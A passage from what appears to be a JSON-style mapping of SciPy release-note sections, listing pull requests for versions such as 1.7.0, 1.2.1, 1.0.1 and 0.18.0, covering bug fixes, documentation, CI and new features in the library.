<https://github.com/scipy/scipy/pull/13808>`__: MAINT: cluster.to_tree: more idiomatic looping over rows of matrix...\n* `13810 <https://github.com/scipy/scipy/pull/13810>`__: MAINT: add a CODEOWNERS file\n* `13811 <https://github.com/scipy/scipy/pull/13811>`__: MAINT: Add ci skip to azp\n* `13814 <https://github.com/scipy/scipy/pull/13814>`__: ENH/DOC: pydata sphinx theme polishing\n* `13817 <https://github.com/scipy/scipy/pull/13817>`__: DOC: Misc parameter typo and casing in scipy/linalg/_decomp_ldl.py\n* `13818 <https://github.com/scipy/scipy/pull/13818>`__: MAINT: stats: keep \\`entropy\\` importable from \\`scipy.stats.distributions\\`\n* `13820 <https://github.com/scipy/scipy/pull/13820>`__: BUG: update _kendall_p_exact ValueError to f-string\n* `13831 <https://github.com/scipy/scipy/pull/13831>`__: FIX:DEP: Allow better tolerance control for pinv and pinvh and...\n* `13832 <https://github.com/scipy/scipy/pull/13832>`__: BUG: stats: Fix rvs for levy_stable when alpha=1\n* `13833 <https://github.com/scipy/scipy/pull/13833>`__: MAINT: Add inline type hintings for stats.qmc\n* `13836 <https://github.com/scipy/scipy/pull/13836>`__: MAINT: Fix a couple compiler warnings.\n* `13838 <https://github.com/scipy/scipy/pull/13838>`__: TST: relax test tolerances for BinomTest\n* `13841 <https://github.com/scipy/scipy/pull/13841>`__: BLD: add \\`-std=c99\\` flag to scipy.special extensions using...\n* `13845 <https://github.com/scipy/scipy/pull/13845>`__: ENH: stats: add \\`method\\` parameter to \\`differential_entropy\\`...\n* `13847 <https://github.com/scipy/scipy/pull/13847>`__: TST: skip on optimize failure on macOS, mark one as xfail\n* `13848 <https://github.com/scipy/scipy/pull/13848>`__: DOC: optimize: move Nelder Mead doc from Unconstrained minimization...\n* `13849 <https://github.com/scipy/scipy/pull/13849>`__: DOC: Roadmap update\n* `13852 <https://github.com/scipy/scipy/pull/13852>`__: CI: fix temporary wrong brew version from GitHub\n* `13854 <https://github.com/scipy/scipy/pull/13854>`__: ENH: Update Scipy Gitpod\n* `13859 <https://github.com/scipy/scipy/pull/13859>`__: TST: fix ultra-slow ttest permutations test\n* `13860 <https://github.com/scipy/scipy/pull/13860>`__: MAINT: clean up LSAP error checking\n* `13863 <https://github.com/scipy/scipy/pull/13863>`__: DOC: remove seed in examples\n* `13865 <https://github.com/scipy/scipy/pull/13865>`__: DOC: optimize: The bounds param of differential_evolution is...\n* `13866 <https://github.com/scipy/scipy/pull/13866>`__: MAINT: special: Remove an unused variable from _poly_approx in...\n* `13867 <https://github.com/scipy/scipy/pull/13867>`__: DOC: stats: Explain meaning of alternatives for fisher_exact.\n* `13868 <https://github.com/scipy/scipy/pull/13868>`__: CI: fix the failing job on linux.\n* `13870 <https://github.com/scipy/scipy/pull/13870>`__: MAINT: move LSAP rectangular matrix handling into solver code\n* `13871 <https://github.com/scipy/scipy/pull/13871>`__: DOC: Add Gitpod documentation\n* `13876 <https://github.com/scipy/scipy/pull/13876>`__: Workflow : Add nightly release of NumPy in linux workflows\n* `13877 <https://github.com/scipy/scipy/pull/13877>`__: DOC: Conform to numpydoc + uniformity.\n* `13879 <https://github.com/scipy/scipy/pull/13879>`__: BUG: signal: fix get_window argument handling and add tests.\n* `13881 <https://github.com/scipy/scipy/pull/13881>`__: CI: remove .travis.yml, remove codecov from CircleCI\n* `13882 <https://github.com/scipy/scipy/pull/13882>`__: BLD: ensure incrementing dev version strings\n* `13886 <https://github.com/scipy/scipy/pull/13886>`__: TST: optimize: skip test_network_flow_limited_capacity w/ UMFPACK...\n* `13888 <https://github.com/scipy/scipy/pull/13888>`__: MAINT: Fix issues involving elif conditions\n* `13891 <https://github.com/scipy/scipy/pull/13891>`__: Rename InivariateSpline to UnivariateSpline\n* `13893 <https://github.com/scipy/scipy/pull/13893>`__: ENH: linprog HiGHS marginals/sensitivy analysis\n* `13894 <https://github.com/scipy/scipy/pull/13894>`__: DOC: Add blank line before \\`Return\\` section.\n* `13897 <https://github.com/scipy/scipy/pull/13897>`__: DOC: BLD: fix doc build version check, and improve build time\n* `13903 <https://github.com/scipy/scipy/pull/13903>`__: MAINT: Gitpod fixes\n* `13907 <https://github.com/scipy/scipy/pull/13907>`__: ENH: Rewrite minkowski metric in C++ with pybind11\n* `13909 <https://github.com/scipy/scipy/pull/13909>`__: Revert \"Workflow : Add nightly release of NumPy in linux workflows\"\n* `13910 <https://github.com/scipy/scipy/pull/13910>`__: DOC: update Readme\n* `13911 <https://github.com/scipy/scipy/pull/13911>`__: MAINT: use dict built-in rather than OrderedDict\n* `13920 <https://github.com/scipy/scipy/pull/13920>`__: BUG: Reactivate conda environment in init\n* `13925 <https://github.com/scipy/scipy/pull/13925>`__: BUG: stats: magnitude of Yates' correction <= abs(observed-expected)...\n* `13926 <https://github.com/scipy/scipy/pull/13926>`__: DOC: correct return type in disjoint_set.subsets docstring\n* `13927 <https://github.com/scipy/scipy/pull/13927>`__: DOC/MAINT: Add copyright notice to qmc.primes_from_2_to\n* `13928 <https://github.com/scipy/scipy/pull/13928>`__: BUG: DOC: signal: fix need argument config and add missing doc...\n* `13929 <https://github.com/scipy/scipy/pull/13929>`__: REL: add PEP 621 (project metadata in pyproject.toml) support\n* `13931 <https://github.com/scipy/scipy/pull/13931>`__: MAINT: special: get rid of _logit.c.src\n* `13934 <https://github.com/scipy/scipy/pull/13934>`__: ENH: signal: make \\`get_window\\` supports \\`general_cosine\\`...\n* `13940 <https://github.com/scipy/scipy/pull/13940>`__: MAINT: QMCEngine d input validation\n* `13941 <https://github.com/scipy/scipy/pull/13941>`__: MAINT: forward port 1.6.3 relnotes\n* `13944 <https://github.com/scipy/scipy/pull/13944>`__: BUG: spatial: fix weight handling of \\`distance.sokalmichener\\`.\n* `13947 <https://github.com/scipy/scipy/pull/13947>`__: MAINT: Remove duplicate calculations in sokalmichener\n* `13949 <https://github.com/scipy/scipy/pull/13949>`__: DOC: minor grammar fixes in minimize and KDTree.query\n* `13951 <https://github.com/scipy/scipy/pull/13951>`__: ENH: Add Boschloo exact test to stats\n* `13956 <https://github.com/scipy/scipy/pull/13956>`__: ENH: spatial: add \\`axis\\` and \\`keepdims\\` optional argument...\n* `13963 <https://github.com/scipy/scipy/pull/13963>`__: MAINT: stats: Fix unused imports and a few other issues related...\n* `13971 <https://github.com/scipy/scipy/pull/13971>`__: DOC: Add Karl Pearson's reference to chi-square test\n* `13972 <https://github.com/scipy/scipy/pull/13972>`__: ENH: cluster: add an optional argument \\`seed\\` for \\`kmeans\\`...\n* `13973 <https://github.com/scipy/scipy/pull/13973>`__: BLD: fix build warnings for causal/anticausal pointers in ndimage\n* `13975 <https://github.com/scipy/scipy/pull/13975>`__: ENH: set empty array norm to zero.\n* `13977 <https://github.com/scipy/scipy/pull/13977>`__: MAINT: signal: replace distutils templating with tempita\n* `13978 <https://github.com/scipy/scipy/pull/13978>`__: MAINT: improve validations and keyword only arguments for some...\n* `13979 <https://github.com/scipy/scipy/pull/13979>`__: ENH: Add Inverse of Log CDF of Normal Distribution\n* `13983 <https://github.com/scipy/scipy/pull/13983>`__: Fixing \\`ndimage.watershed_ift\\` tutorial's documentation\n* `13987 <https://github.com/scipy/scipy/pull/13987>`__: DOC: Adding examples to docstrings in morphology: white_tophat,...\n* `13989 <https://github.com/scipy/scipy/pull/13989>`__: DOC: interpolate: improve examples of \\`RegularGridInterpolator\\`...\n* `13990 <https://github.com/scipy/scipy/pull/13990>`__: MAINT, DOC: optimize: Make the input validation explanation clear...\n* `13992 <https://github.com/scipy/scipy/pull/13992>`__: Workflow : Add nightly release of NumPy in linux workflows\n* `13995 <https://github.com/scipy/scipy/pull/13995>`__: Doc: Continuous integration information\n* `14000 <https://github.com/scipy/scipy/pull/14000>`__: BUG: sparse: Fix DIA.diagonal bug and add a regression test\n* `14004 <https://github.com/scipy/scipy/pull/14004>`__: ENH: Fast addition dia matrix\n* `14006 <https://github.com/scipy/scipy/pull/14006>`__: MAINT: optimize: add validation to check func parameter number...\n* `14008 <https://github.com/scipy/scipy/pull/14008>`__: BUG: Raise exception for inconsistent WAV header\n* `14009 <https://github.com/scipy/scipy/pull/14009>`__: DEP: Remove usage of numpy.compat\n* `14010 <https://github.com/scipy/scipy/pull/14010>`__: MAINT: add support for wheel DL proxy\n* `14012 <https://github.com/scipy/scipy/pull/14012>`__: DOC: Broaden Exact Test Reference\n* `14015 <https://github.com/scipy/scipy/pull/14015>`__: MAINT: remove brew update\n* `14017 <https://github.com/scipy/scipy/pull/14017>`__: BENCH: Add more formats for sparse arithmetic\n* `14018 <https://github.com/scipy/scipy/pull/14018>`__: BENCH: add benchmark for f_oneway\n* `14020 <https://github.com/scipy/scipy/pull/14020>`__: MAINT: modify np.int\\_ to np.int32 to make it the same for 32/64...\n* `14023 <https://github.com/scipy/scipy/pull/14023>`__: MAINT: Fix clang build and remove some unicode characters\n* `14025 <https://github.com/scipy/scipy/pull/14025>`__: BUG: sparse: fix DIA.setdiag issue\n* `14026 <https://github.com/scipy/scipy/pull/14026>`__: TST: optimize: xfail part of test_powell\n* `14029 <https://github.com/scipy/scipy/pull/14029>`__: CI: github macos fix\n* `14030 <https://github.com/scipy/scipy/pull/14030>`__: MAINT: use 'yield from <expr>' (PEP 380)\n* `14031 <https://github.com/scipy/scipy/pull/14031>`__: MAINT: new-style class, removing inheritance to object\n* `14032 <https://github.com/scipy/scipy/pull/14032>`__: MAINT: CXXFLAGS for Pythran\n* `14033 <https://github.com/scipy/scipy/pull/14033>`__: ENH: Port sqeuclidean and braycurtis to _distance_pybind\n* `14034 <https://github.com/scipy/scipy/pull/14034>`__: MAINT: Clean-up 'next = __next__'\n* `14045 <https://github.com/scipy/scipy/pull/14045>`__: MAINT: bump PYVER pavement.py\n* `14047 <https://github.com/scipy/scipy/pull/14047>`__: DEV: initialize boost submodule in Gitpod Dockerfile\n* `14051 <https://github.com/scipy/scipy/pull/14051>`__: BLD: if boost submodule content is missing, error out early\n* `14052 <https://github.com/scipy/scipy/pull/14052>`__: DOC: missing submodule init information\n* `14057 <https://github.com/scipy/scipy/pull/14057>`__: DOC: special: Add Examples to \\`psi\\` docstring\n* `14058 <https://github.com/scipy/scipy/pull/14058>`__: BUG: fixed a dtype bug in linalg.solve.\n* `14060 <https://github.com/scipy/scipy/pull/14060>`__: Doc: Fix typo in documentation of spence function.\n* `14061 <https://github.com/scipy/scipy/pull/14061>`__: MAINT:stats: Type annotations for _sobol.pyx\n* `14062 <https://github.com/scipy/scipy/pull/14062>`__: DOC: A few small fixes in quickstart_gitpod.rst\n* `14063 <https://github.com/scipy/scipy/pull/14063>`__: DOC: signal: add Add Examples to \\`cont2discrete\\` docstring\n* `14064 <https://github.com/scipy/scipy/pull/14064>`__: DOC: optimize: Add Examples to fmin_bfgs docstring\n* `14065 <https://github.com/scipy/scipy/pull/14065>`__: Add example for scipy stats.trim1 under docstring\n* `14066 <https://github.com/scipy/scipy/pull/14066>`__: DOC add example to scipy.special.hermite\n* `14067 <https://github.com/scipy/scipy/pull/14067>`__: DOC add alpha docstring description, add example to docstring\n* `14070 <https://github.com/scipy/scipy/pull/14070>`__: DOC add parameters, return, and example to docstring\n* `14072 <https://github.com/scipy/scipy/pull/14072>`__: MAINT/TST: Fix tests failing with the nightly build of numpy.\n* `14075 <https://github.com/scipy/scipy/pull/14075>`__: DOC Improve the code snippet in signal.hilbert docstring.\n* `14076 <https://github.com/scipy/scipy/pull/14076>`__: DOC: Document Jensen-Shannon distance being accepted by cdist/pdist\n* `14079 <https://github.com/scipy/scipy/pull/14079>`__: BLD: Avoid importing scipy.stats during cythonize stage\n* `14082 <https://github.com/scipy/scipy/pull/14082>`__: MAINT: Remove old, commented extract_diagonal\n* `14083 <https://github.com/scipy/scipy/pull/14083>`__: MAINT: sparse: Remove defunct function extract_diagonal\n* `14085 <https://github.com/scipy/scipy/pull/14085>`__: ENH: Implement canberra distance in _distance_pybind\n* `14086 <https://github.com/scipy/scipy/pull/14086>`__: MAINT: Clear scipy namespace of entries better imported from...\n* `14088 <https://github.com/scipy/scipy/pull/14088>`__: Install Pythran from sources for python 3.10\n* `14092 <https://github.com/scipy/scipy/pull/14092>`__: BUG: Fixes issue with clang.\n* `14094 <https://github.com/scipy/scipy/pull/14094>`__: DOC: Correct the inconsistence definition of Default in class...\n* `14105 <https://github.com/scipy/scipy/pull/14105>`__: TST: stats: mannwhitneyu: check that mstats and stats mannwhitneyu...\n* `14106 <https://github.com/scipy/scipy/pull/14106>`__: DOC: stats.mstats: mannwhitneyu: the returned statistic is the...\n* `14107 <https://github.com/scipy/scipy/pull/14107>`__: ENH: stats: bootstrap: add \\`vectorized\\` parameter; automatically...\n* `14109 <https://github.com/scipy/scipy/pull/14109>`__: BUG: fix two issues in the fblas signature files\n* `14110 <https://github.com/scipy/scipy/pull/14110>`__: DOC: mailmap update\n* `14113 <https://github.com/scipy/scipy/pull/14113>`__: ENH: stats: bootstrap: add \\`paired\\` parameter\n* `14116 <https://github.com/scipy/scipy/pull/14116>`__: MAINT: fix deprecated Python C API usage in odr\n* `14118 <https://github.com/scipy/scipy/pull/14118>`__: DOC: 1.7.0 release notes\n* `14125 <https://github.com/scipy/scipy/pull/14125>`__: DOC: fix typo\n* `14126 <https://github.com/scipy/scipy/pull/14126>`__: ENH: stats: bootstrap: add \\`batch\\` parameter to control batch...\n* `14127 <https://github.com/scipy/scipy/pull/14127>`__: CI: upgrade pip in benchmarks CI run\n* `14130 <https://github.com/scipy/scipy/pull/14130>`__: BUG: Fix trust-constr report TypeError if verbose is set to 2...\n* `14133 <https://github.com/scipy/scipy/pull/14133>`__: MAINT: interpolate: raise NotImplementedError not ValueError\n* `14139 <https://github.com/scipy/scipy/pull/14139>`__: FIX/DOC: lsqr doctests print failure\n* `14145 <https://github.com/scipy/scipy/pull/14145>`__: MAINT: 1.7.x version pins (\"backport\")\n* `14146 <https://github.com/scipy/scipy/pull/14146>`__: MAINT: commit count if no tag\n* `14164 <https://github.com/scipy/scipy/pull/14164>`__: TST, BUG: fix rbf matrix value\n* `14166 <https://github.com/scipy/scipy/pull/14166>`__: CI, MAINT: restrictions on pre-release CI\n* `14171 <https://github.com/scipy/scipy/pull/14171>`__: TST: signal: Bump tolerances for a test of Gustafsson's...\n* `14175 <https://github.com/scipy/scipy/pull/14175>`__: TST: stats: Loosen tolerance in some binomtest tests.\n* `14182 <https://github.com/scipy/scipy/pull/14182>`__: MAINT: stats: Update ppcc_plot and ppcc_max docstring.\n* `14195 <https://github.com/scipy/scipy/pull/14195>`__: MAINT: download-wheels missing import\n* `14230 <https://github.com/scipy/scipy/pull/14230>`__: REL: stop shipping generated Cython sources in sdist\n\n\n==========================\n", "1.2.1": "-----------------------\n\n* `9612 <https://github.com/scipy/scipy/pull/9612>`__: BUG: don't use array newton unless size is greater than 1\n* `9615 <https://github.com/scipy/scipy/pull/9615>`__: ENH: Add test for encoding\n* `9720 <https://github.com/scipy/scipy/pull/9720>`__: BUG: stats: weighted KDE does not modify the weights array\n* `9739 <https://github.com/scipy/scipy/pull/9739>`__: BUG: qr_updates fails if u is exactly in span Q\n* `9725 <https://github.com/scipy/scipy/pull/9725>`__: TST: pin mingw for Azure Win CI\n* `9736 <https://github.com/scipy/scipy/pull/9736>`__: TST: adjust to vmImage dispatch in Azure\n* `9681 <https://github.com/scipy/scipy/pull/9681>`__: BUG: Fix failing stats tests (partial backport)\n* `9662 <https://github.com/scipy/scipy/pull/9662>`__: TST: interpolate: avoid pytest deprecations\n\n\n==========================\n", "0.3.5.dev": "in SciPy 1.2.0.\n\nAuthors\n=======\n\n* Eric Larson\n* Mark Mikofski\n* Evgeni Burovski\n* Ralf Gommers\n* Eric Moore\n* Tyler Reddy\n\n", "1.2.2": "-----------------------\n* `10056 <https://github.com/scipy/scipy/pull/10056>`__: BUG: Ensure factorial is not too large in kendaltau\n* `9991 <https://github.com/scipy/scipy/pull/9991>`__: BUG: Avoid inplace modification of input array in newton\n* `9788 <https://github.com/scipy/scipy/pull/9788>`__: TST, BUG: f2py-related issues with NumPy < 1.14.0\n* `9749 <https://github.com/scipy/scipy/pull/9749>`__: BUG: MapWrapper.__exit__ should terminate\n* `10141 <https://github.com/scipy/scipy/pull/10141>`__: Update description for nnz on csc.py \n\n\n==========================\n", "0.10.1": "\nMain changes\n------------\n\nThe most important changes are:\n\n1. The single precision routines of ``eigs`` and ``eigsh`` in\n   ``scipy.sparse.linalg`` have been disabled (they internally use double\n   precision now).\n2. A compatibility issue related to changes in NumPy macros has been fixed, in\n   order to make scipy 0.10.1 compile with the upcoming numpy 1.7.0 release.\n\n\nOther issues fixed\n------------------\n\n- 835: stats: nan propagation in stats.distributions\n- 1202: io: netcdf segfault\n- 1531: optimize: make curve_fit work with method as callable.\n- 1560: linalg: fixed mistake in eig_banded documentation.\n- 1565: ndimage: bug in ndimage.variance\n- 1457: ndimage: standard_deviation does not work with sequence of indexes\n- 1562: cluster: segfault in linkage function\n- 1568: stats: One-sided fisher_exact() returns `p` < 1 for 0 successful attempts\n- 1575: stats: zscore and zmap handle the axis keyword incorrectly\n\n\n\n==========================\n", "1.0.1": "-----------------------\n\n- `8068 <https://github.com/scipy/scipy/pull/8068>`__: BUG: fix numpy deprecation test failures\n- `8082 <https://github.com/scipy/scipy/pull/8082>`__: BUG: fix solve_lyapunov import\n- `8144 <https://github.com/scipy/scipy/pull/8144>`__: MRG: Fix for cobyla\n- `8150 <https://github.com/scipy/scipy/pull/8150>`__: MAINT: resolve UPDATEIFCOPY deprecation errors\n- `8156 <https://github.com/scipy/scipy/pull/8156>`__: BUG: missing check on minkowski w kwarg\n- `8187 <https://github.com/scipy/scipy/pull/8187>`__: BUG: Sign of elements in random orthogonal 2D matrices in \"ortho_group_gen\"...\n- `8197 <https://github.com/scipy/scipy/pull/8197>`__: CI: uninstall oclint\n- `8215 <https://github.com/scipy/scipy/pull/8215>`__: Fixes Numpy datatype compatibility issues\n- `8237 <https://github.com/scipy/scipy/pull/8237>`__: BUG: optimize: fix bug when variables fixed by bounds are inconsistent...\n- `8248 <https://github.com/scipy/scipy/pull/8248>`__: BUG: declare \"gfk\" variable before call of terminate() in newton-cg\n- `8280 <https://github.com/scipy/scipy/pull/8280>`__: REV: reintroduce csgraph import in scipy.sparse\n- `8322 <https://github.com/scipy/scipy/pull/8322>`__: MAINT: prevent scipy.optimize.root segfault closes #8320\n- `8334 <https://github.com/scipy/scipy/pull/8334>`__: TST: stats: don't use exact equality check for hdmedian test\n- `8477 <https://github.com/scipy/scipy/pull/8477>`__: BUG: signal/signaltools: fix wrong refcounting in PyArray_OrderFilterND\n- `8530 <https://github.com/scipy/scipy/pull/8530>`__: BUG: linalg: Fixed typo in flapack.pyf.src.\n- `8566 <https://github.com/scipy/scipy/pull/8566>`__: CI: Temporarily pin Cython version to 0.27.3\n- `8573 <https://github.com/scipy/scipy/pull/8573>`__: Backports for 1.0.1\n- `8581 <https://github.com/scipy/scipy/pull/8581>`__: Fix Cython 0.28 build break of qhull.pyx\n\n\n==========================\n", "0.18.0": "------------------------\n\n- `3226 <https://github.com/scipy/scipy/pull/3226>`__: DOC: Change `nb` and `na` to conventional m and n\n- `3867 <https://github.com/scipy/scipy/pull/3867>`__: allow cKDTree.query taking a list input in k.\n- `4191 <https://github.com/scipy/scipy/pull/4191>`__: ENH: Benchmarking global optimizers\n- `4356 <https://github.com/scipy/scipy/pull/4356>`__: ENH: add PPoly.solve(y) for solving ``p(x) == y``\n- `4370 <https://github.com/scipy/scipy/pull/4370>`__: DOC separate boolean distance functions for clarity\n- `4678 <https://github.com/scipy/scipy/pull/4678>`__: BUG: sparse: ensure index dtype is large enough to pass all parameters...\n- `4881 <https://github.com/scipy/scipy/pull/4881>`__: scipy.signal: Add the class dlti for linear discrete-time systems....\n- `4901 <https://github.com/scipy/scipy/pull/4901>`__: MAINT: add benchmark and improve docstring for signal.lfilter\n- `5043 <https://github.com/scipy/scipy/pull/5043>`__: ENH: sparse: add count_nonzero method\n- `5136 <https://github.com/scipy/scipy/pull/5136>`__: Attribute kurtosistest() to Anscombe & Glynn (1983)\n- `5186 <https://github.com/scipy/scipy/pull/5186>`__: ENH: Port upfirdn\n- `5232 <https://github.com/scipy/scipy/pull/5232>`__: ENH: adding spherical Voronoi diagram algorithm to scipy.spatial\n- `5279 <https://github.com/scipy/scipy/pull/5279>`__: ENH: Bessel filters with different normalizations, high order\n- `5384 <https://github.com/scipy/scipy/pull/5384>`__: BUG: Closes #5027 distance function always casts bool to double\n- `5392 <https://github.com/scipy/scipy/pull/5392>`__: ENH: Add zero_phase kwarg to signal.decimate\n- `5394 <https://github.com/scipy/scipy/pull/5394>`__: MAINT: sparse: non-canonical test cleanup and fixes\n- `5424 <https://github.com/scipy/scipy/pull/5424>`__: DOC: add Scipy developers guide\n- `5442 <https://github.com/scipy/scipy/pull/5442>`__: STY: PEP8 amendments\n- `5472 <https://github.com/scipy/scipy/pull/5472>`__: Online QR in LGMRES\n- `5526 <https://github.com/scipy/scipy/pull/5526>`__: BUG: stats: Fix broadcasting in the rvs() method of the distributions.\n- `5530 <https://github.com/scipy/scipy/pull/5530>`__: MAINT: sparse: set `format` attr explicitly\n- `5536 <https://github.com/scipy/scipy/pull/5536>`__: optimize: fix up cg/bfgs initial step sizes\n- `5548 <https://github.com/scipy/scipy/pull/5548>`__: PERF: improves performance in stats.kendalltau\n- `5549 <https://github.com/scipy/scipy/pull/5549>`__: ENH: Nearest-neighbor chain algorithm for hierarchical clustering\n- `5554 <https://github.com/scipy/scipy/pull/5554>`__: MAINT/BUG: closes overflow bug in stats.tiecorrect\n- `5557 <https://github.com/scipy/scipy/pull/5557>`__: BUG: modify optimize.bisect to achieve desired tolerance\n- `5581 <https://github.com/scipy/scipy/pull/5581>`__: DOC: Tutorial for least_squares\n- `5606 <https://github.com/scipy/scipy/pull/5606>`__: ENH: differential_evolution - moving core loop of solve method...\n- `5609 <https://github.com/scipy/scipy/pull/5609>`__: [MRG] test against numpy dev\n- `5611 <https://github.com/scipy/scipy/pull/5611>`__: use setuptools for bdist_egg distributions\n- `5615 <https://github.com/scipy/scipy/pull/5615>`__: MAINT: linalg: tighten _decomp_update + special: remove unused...\n- `5622 <https://github.com/scipy/scipy/pull/5622>`__: Add SO(N) rotation matrix generator\n- `5623 <https://github.com/scipy/scipy/pull/5623>`__: ENH: special: Add vectorized spherical Bessel functions.\n- `5627 <https://github.com/scipy/scipy/pull/5627>`__: Response to issue #5160, implements the skew normal distribution...\n- `5628 <https://github.com/scipy/scipy/pull/5628>`__: DOC: Align the description and operation\n- `5632 <https://github.com/scipy/scipy/pull/5632>`__: DOC: special: Expanded docs for Airy, elliptic, Bessel functions.\n- `5633 <https://github.com/scipy/scipy/pull/5633>`__: MAINT: linalg: unchecked malloc in _decomp_update\n- `5634 <https://github.com/scipy/scipy/pull/5634>`__: MAINT: optimize: tighten _group_columns\n- `5640 <https://github.com/scipy/scipy/pull/5640>`__: Fixes for io.netcdf masking\n- `5645 <https://github.com/scipy/scipy/pull/5645>`__: MAINT: size 0 vector handling in cKDTree range queries\n- `5649 <https://github.com/scipy/scipy/pull/5649>`__: MAINT: update license text\n- `5650 <https://github.com/scipy/scipy/pull/5650>`__: DOC: Clarify Exponent Order in ltisys.py\n- `5651 <https://github.com/scipy/scipy/pull/5651>`__: DOC: Clarify Documentation for scipy.special.gammaln\n- `5652 <https://github.com/scipy/scipy/pull/5652>`__: DOC: Fixed scipy.special.betaln Doc\n- `5653 <https://github.com/scipy/scipy/pull/5653>`__: [MRG] ENH: CubicSpline interpolator\n- `5654 <https://github.com/scipy/scipy/pull/5654>`__: ENH: Burr12 distribution to stats module\n- `5659 <https://github.com/scipy/scipy/pull/5659>`__: DOC: Define BEFORE/AFTER in runtests.py -h for bench-compare\n- `5660 <https://github.com/scipy/scipy/pull/5660>`__: MAINT: remove functions deprecated before 0.16.0\n- `5662 <https://github.com/scipy/scipy/pull/5662>`__: ENH: Circular statistic optimization\n- `5663 <https://github.com/scipy/scipy/pull/5663>`__: MAINT: remove uses of np.testing.rand\n- `5665 <https://github.com/scipy/scipy/pull/5665>`__: MAINT: spatial: remove matching distance implementation\n- `5667 <https://github.com/scipy/scipy/pull/5667>`__: Change some HTTP links to HTTPS\n- `5669 <https://github.com/scipy/scipy/pull/5669>`__: DOC: zpk2sos can't do analog, array_like, etc.\n- `5670 <https://github.com/scipy/scipy/pull/5670>`__: Update conf.py\n- `5672 <https://github.com/scipy/scipy/pull/5672>`__: MAINT: move a sample distribution to a subclass of rv_discrete\n- `5678 <https://github.com/scipy/scipy/pull/5678>`__: MAINT: stats: remove est_loc_scale method\n- `5679 <https://github.com/scipy/scipy/pull/5679>`__: MAINT: DRY up generic computations for discrete distributions\n- `5680 <https://github.com/scipy/scipy/pull/5680>`__: MAINT: stop shadowing builtins in stats.distributions\n- `5681 <https://github.com/scipy/scipy/pull/5681>`__: forward port ENH: Re-enable broadcasting of fill_value\n- `5684 <https://github.com/scipy/scipy/pull/5684>`__: BUG: Fix Akima1DInterpolator returning nans\n- `5690 <https://github.com/scipy/scipy/pull/5690>`__: BUG: fix stats.ttest_ind_from_stats to handle arrays.\n- `5691 <https://github.com/scipy/scipy/pull/5691>`__: BUG: fix generator in io._loadarff to comply with PEP 0479\n- `5693 <https://github.com/scipy/scipy/pull/5693>`__: ENH: use math.factorial for exact factorials\n- `5695 <https://github.com/scipy/scipy/pull/5695>`__: DOC: dx might be a float, not only an integer\n- `5699 <https://github.com/scipy/scipy/pull/5699>`__: MAINT: io: micro-optimize Matlab reading code for size\n- `5701 <https://github.com/scipy/scipy/pull/5701>`__: Implement OptimizeResult.__dir__\n- `5703 <https://github.com/scipy/scipy/pull/5703>`__: ENH: stats: make R\u00b2 printing optional in probplot\n- `5704 <https://github.com/scipy/scipy/pull/5704>`__: MAINT: typo ouf->out\n- `5705 <https://github.com/scipy/scipy/pull/5705>`__: BUG: fix typo in query_pairs\n- `5707 <https://github.com/scipy/scipy/pull/5707>`__: DOC:Add some explanation for ftol xtol in scipy.optimize.fmin\n- `5708 <https://github.com/scipy/scipy/pull/5708>`__: DOC: optimize: PEP8 minimize docstring\n- `5709 <https://github.com/scipy/scipy/pull/5709>`__: MAINT: optimize Cython code for speed and size\n- `5713 <https://github.com/scipy/scipy/pull/5713>`__: [DOC] Fix broken link to reference\n- `5717 <https://github.com/scipy/scipy/pull/5717>`__: DOC: curve_fit raises RuntimeError on failure.\n- `5724 <https://github.com/scipy/scipy/pull/5724>`__: forward port gh-5720\n- `5728 <https://github.com/scipy/scipy/pull/5728>`__: STY: remove a blank line\n- `5729 <https://github.com/scipy/scipy/pull/5729>`__: ENH: spatial: speed up boolean distances\n- `5732 <https://github.com/scipy/scipy/pull/5732>`__: MAINT: differential_evolution changes to default keywords break...\n- `5733 <https://github.com/scipy/scipy/pull/5733>`__: TST: differential_evolution - population initiation tests\n- `5736 <https://github.com/scipy/scipy/pull/5736>`__: Complex number support in log1p, expm1, and xlog1py\n- `5741 <https://github.com/scipy/scipy/pull/5741>`__: MAINT: sparse: clean up extraction functions\n- `5742 <https://github.com/scipy/scipy/pull/5742>`__: DOC: signal: Explain fftbins in get_window\n- `5748 <https://github.com/scipy/scipy/pull/5748>`__: ENH: Add O(N) random matrix generator\n- `5749 <https://github.com/scipy/scipy/pull/5749>`__: ENH: Add polyphase resampling\n- `5756 <https://github.com/scipy/scipy/pull/5756>`__: RFC: Bump the minimum numpy version, drop older python versions\n- `5761 <https://github.com/scipy/scipy/pull/5761>`__: DOC: Some improvements to least squares docstrings\n- `5762 <https://github.com/scipy/scipy/pull/5762>`__: MAINT: spatial: distance refactoring\n- `5768 <https://github.com/scipy/scipy/pull/5768>`__: DOC: Fix io.loadmat docstring for mdict param\n- `5770 <https://github.com/scipy/scipy/pull/5770>`__: BUG: Accept anything np.dtype can handle for a dtype in sparse.random\n- `5772 <https://github.com/scipy/scipy/pull/5772>`__: Update sparse.csgraph.laplacian docstring\n- `5777 <https://github.com/scipy/scipy/pull/5777>`__: BUG: fix special.hyp0f1 to work correctly for complex inputs.\n- `5780 <https://github.com/scipy/scipy/pull/5780>`__: DOC: Update PIL error install URL\n- `5781 <https://github.com/scipy/scipy/pull/5781>`__: DOC: Fix documentation on solve_discrete_lyapunov\n- `5782 <https://github.com/scipy/scipy/pull/5782>`__: DOC: cKDTree and KDTree now reference each other\n- `5783 <https://github.com/scipy/scipy/pull/5783>`__: DOC: Clarify finish behaviour in scipy.optimize.brute\n- `5784 <https://github.com/scipy/scipy/pull/5784>`__: MAINT: Change default tolerances of least_squares to 1e-8\n- `5787 <https://github.com/scipy/scipy/pull/5787>`__: BUG: Allow Processing of Zero Order State Space Models in signal.ss2tf\n- `5788 <https://github.com/scipy/scipy/pull/5788>`__: DOC, BUG: Clarify and Enforce Input Types to 'Data' Objects\n- `5789 <https://github.com/scipy/scipy/pull/5789>`__: ENH: sparse: speedup LIL matrix slicing (was #3338)\n- `5791 <https://github.com/scipy/scipy/pull/5791>`__: DOC: README: remove coveralls.io\n- `5792 <https://github.com/scipy/scipy/pull/5792>`__: MAINT: remove uses of deprecated np.random.random_integers\n- `5794 <https://github.com/scipy/scipy/pull/5794>`__: fix affine_transform (fixes #1547 and 5702)\n- `5795 <https://github.com/scipy/scipy/pull/5795>`__: DOC: Removed uniform method from kmeans2 doc\n- `5797 <https://github.com/scipy/scipy/pull/5797>`__: DOC: Clarify the computation of weighted minkowski\n- `5798 <https://github.com/scipy/scipy/pull/5798>`__: BUG: Ensure scipy's _asfarray returns ndarray\n- `5799 <https://github.com/scipy/scipy/pull/5799>`__: TST: Mpmath testing patch\n- `5801 <https://github.com/scipy/scipy/pull/5801>`__: allow reading of certain IDL 8.0 